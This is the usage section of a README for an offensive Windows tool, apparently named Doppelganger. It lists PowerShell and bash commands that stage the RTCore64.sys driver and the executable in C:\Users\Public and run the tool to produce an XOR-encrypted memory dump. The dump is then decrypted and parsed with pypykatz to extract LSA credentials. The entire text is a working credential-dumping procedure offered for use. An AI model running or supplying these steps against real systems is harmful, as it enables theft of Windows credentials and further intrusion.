# USAGE

```powershell
cp .\RTCore64.sys C:\Users\Public
cp .\Doppelganger.exe C:\Users\Public
C:\Users\Public\Doppelganger.exe
```

Download C:\Users\Public\doppelganger.dmp

```bash
python decrypt_xor_dump.py
pypykatz lsa minidump doppelganger.dmp.dec
```